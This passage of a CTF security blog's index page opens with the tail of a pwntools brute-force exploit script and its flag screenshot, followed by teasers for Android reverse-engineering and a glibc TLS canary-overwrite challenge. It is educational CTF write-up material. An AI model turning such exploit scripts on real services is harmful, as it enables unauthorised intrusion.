class="line">    <span class="comment"># io = remote(&quot;127.0.0.1&quot;, 9090)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;103\n255\n105\n191\n16\n81\n71\n74\n41\n163\n&quot;</span></span><br><span class="line">    payload += <span class="string">b&quot;321\n329\n321\n329\n321\n329\n&quot;</span></span><br><span class="line">    payload = <span class="string">b&#x27;\n&#x27;</span> + payload</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Hard&quot;</span>, <span class="string">b&quot;hard&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Ready&quot;</span>, payload)</span><br><span class="line">    <span class="comment"># 329-336 start_ns</span></span><br><span class="line">    <span class="comment"># 321-328 end_ns</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        pwn()</span><br><span class="line">        mes = io.recvrepeat(<span class="number">2.2</span>)</span><br><span class="line">        <span class="keyword">if</span> (mes.find(<span class="string">b&quot;for you troubles:&quot;</span>) != -<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(mes[mes.find(<span class="string">b&quot;for you troubles:&quot;</span>):])</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后附上爆破出flag的截图~ 今天早上挂上脚本后去干别的事了，回来突然看到打出来了很激动哈哈哈。</p>
<p><img src="https://i.imgtg.com/2023/03/10/fMewp.png" alt="嘿嘿嘿"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/4ac4cf560d13.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/4ac4cf560d13.html" class="post-title-link" itemprop="url">【PoRE#0x01】Android APP Reverse PartI</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-08 18:08:00" itemprop="dateCreated datePublished" datetime="2023-03-08T18:08:00+08:00">2023-03-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/4ac4cf560d13.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x01】Android APP Reverse PartI" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/4ac4cf560d13.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/4ac4cf560d13.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>下篇见 <a target="_blank" rel="noopener" href="https://cameudis.github.io/Tech/PoRE/63955eff56fa.html">这里</a></p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/PoRE/4ac4cf560d13.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/33ac9256da88.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/33ac9256da88.html" class="post-title-link" itemprop="url">【Pwn#0x0C】*CTF 2018 babystack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-03-08 10:25:50" itemprop="dateCreated datePublished" datetime="2023-03-08T10:25:50+08:00">2023-03-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/33ac9256da88.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x0C】*CTF 2018 babystack" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/33ac9256da88.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/33ac9256da88.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>攻击GLIBC的TLS结构体，覆写Canary。<br>快速学习了一下Pthread，大致知道了多线程的用法。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/Tech/Pwn/33ac9256da88.html#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Cameudis"
      src="/images/ava1.jpg">
  <p class="site-author-name" itemprop="name">Cameudis</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">69</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-dove"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cameudis</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  















    <div id="pjax">
  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
      appKey     : '6VqGye1352LX381YQDTOaiXs',
      placeholder: "El Psy Congroo",
      avatar     : 'retro',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

    </div>
</body>
</html>
